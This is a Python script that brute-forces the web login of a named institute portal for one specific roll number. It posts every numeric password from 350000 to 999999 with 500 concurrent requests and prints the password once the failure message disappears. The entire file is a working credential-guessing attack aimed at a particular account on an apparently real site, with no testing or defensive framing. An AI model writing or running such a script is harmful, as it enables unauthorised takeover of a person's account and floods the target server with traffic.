import asyncio
import aiohttp
import sys

URL = "https://app.biomeinstitute.in/weblogin/"
ROLL = "25002833"
START = 350000
END = 999999
CONCURRENT_REQUESTS = 500  # adjust based on server & network limits

async def try_password(session, password):
    data = {
        "sublogin": "1",
        "username": ROLL,
        "password": str(password),
        "Login": "Secure Login"
    }
    async with session.post(URL, data=data) as response:
        text = await response.text()
        if "Invalid your username and password" not in text:
            print(f"SUCCESS! Roll: {ROLL}  Password: {password}")
            # Stop the event loop if found
            for task in asyncio.all_tasks():
                task.cancel()
            return True
    return False

async def worker(queue, session):
    while True:
        try:
            password = await queue.get()
            await try_password(session, password)
            queue.task_done()
        except asyncio.CancelledError:
            break

async def main():
    queue = asyncio.Queue()
    for pwd in range(START, END + 1):
        await queue.put(pwd)

    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(worker(queue, session)) for _ in range(CONCURRENT_REQUESTS)]
        try:
            await queue.join()
        except asyncio.CancelledError:
            pass

        for t in tasks:
            t.cancel()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit("Stopped by user.")
